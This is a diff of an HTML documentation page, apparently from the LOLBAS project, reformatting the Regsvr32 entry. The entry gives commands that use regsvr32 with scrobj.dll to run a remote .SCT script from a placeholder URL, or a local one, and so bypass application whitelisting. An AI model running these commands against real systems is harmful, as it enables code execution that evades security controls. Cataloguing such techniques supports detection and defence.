@@ -31,9 +31,78 @@
 </h1>
 
 
+<ul class="function-list">
+    
+    
+    <li><a href="/lolbas/Binaries/Regsvr32/#awl-bypass">AWL bypass</a></li>
+    
+    
+    <li><a href="/lolbas/Binaries/Regsvr32/#execute">Execute</a></li>
+    
+</ul>
+
+<p>Used by Windows to register dll files.</p>
+
+<br>
+<p><b>Paths:</b> 
+	<ul style="list-style-type:none">
+	
+	<li>c:\windows\system32\regsvr32.exe</li>
+	
+	<li>c:\windows\sysWOW64\regsvr32.exe</li>
+	 
+	</ul>
+</p>
+<br>
+<b>Resources:</b> 	
+	<ul style="list-style-type:none">
+	
+	<li><a href="https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/">https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/</a></li>
+	
+	<li><a href="https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/">https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/</a></li>
+	 
+	</ul>
+<br>
+<b>Contributors:</b> <p>Thanks to Casey Smith - @subtee</p>
+
+<br>
 
 
 
+
+
+
+<h2 id="awl-bypass" class="function-name">AWL bypass</h2>
+
+<p>The LOLBAS can bypass application whitelisting solutions.</p>
+
+
+<ul class="examples">
+
+    
+
+
+
+    <li>
+        <p>Execute the specified remote .SCT script with scrobj.dll.</p>
+
+        <pre><code>regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll</code></pre>
+    </li>
+
+    
+
+
+
+    <li>
+        <p>Execute the specified local .SCT script with scrobj.dll.</p>
+
+        <pre><code>regsvr32.exe /s /u /i:file.sct scrobj.dll</code></pre>
+    </li>
+
+    
+
+</ul>
+<br>
 
 
 
@@ -46,28 +115,31 @@
 
 <ul class="examples">
 
-	
-    <li>
-        <h3>Name</h3>
-		<pre><code>Regsvr32.exe</code></pre>
-        <h3>Commands</h3>
-        <pre><code>Command: regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
-Description: Execute the specified remote .SCT script with scrobj.dll.
-      Commands: | regsvr32.exe /s /u /i:file.sct scrobj.dll
-Description: Execute the specified local .SCT script with scrobj.dll.</code></pre>
-        <h3>Full Path</h3>
-        <pre><code>C:\Windows\System32\regsvr32.exe C:\Windows\SysWOW64\regsvr32.exe</code></pre>
-        <h3>Code Sample</h3>
-        <pre><code></code></pre>
-        <h3>Resources</h3>
-		<pre><code>https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Regsvr32.md
-https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/
-https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/</code></pre>
-        <h3>Notes</h3>
-        <pre><code>Thanks to Casey Smith - @subtee</code></pre>
-    </li>
     
+
+
+
+    <li>
+        <p>Execute the specified remote .SCT script with scrobj.dll.</p>
+
+        <pre><code>regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll</code></pre>
+    </li>
+
+    
+
+
+
+    <li>
+        <p>Execute the specified local .SCT script with scrobj.dll.</p>
+
+        <pre><code>regsvr32.exe /s /u /i:file.sct scrobj.dll</code></pre>
+    </li>
+
+    
+
 </ul>
+<br>
+
 
 
         <script>
